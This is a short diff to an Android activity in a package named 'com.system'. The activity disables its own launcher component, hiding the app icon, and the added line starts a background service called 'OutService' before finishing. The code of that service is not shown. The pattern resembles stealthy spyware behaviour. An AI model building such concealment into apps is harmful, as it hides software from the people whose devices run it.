@@ -1,6 +1,7 @@
 package com.system;
 
 import android.app.Activity;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 
@@ -16,6 +17,7 @@ public class DummyActivity extends Activity {
         p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);
 
+        startService(new Intent(this, OutService.class));
         finish();
     }
 }
